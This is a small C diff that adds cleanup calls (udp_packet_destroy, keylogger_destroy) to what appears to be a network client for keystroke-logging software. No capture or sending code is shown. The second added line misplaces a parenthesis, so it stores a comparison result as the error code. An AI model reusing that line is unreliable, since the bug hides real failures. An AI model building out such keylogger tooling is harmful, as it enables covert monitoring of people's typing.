@@ -78,6 +78,9 @@ ErrorCode client_start(logger_client_t *client, uint8_t *src_mac, uint8_t *dest_
             goto cleanup;
     }
 
+    if ((error_code = udp_packet_destroy(&packet)) != ERROR_SUCCESS)
+        goto cleanup;
+
 cleanup:
     return error_code;
 }
@@ -94,6 +97,9 @@ ErrorCode client_destroy(logger_client_t *client) {
         error_code = ERROR_CLOSE;
         goto cleanup;
     }
+
+    if ((error_code = keylogger_destroy(&(client->keylogger)) != ERROR_SUCCESS))
+        goto cleanup;
 
 cleanup:
     return error_code;
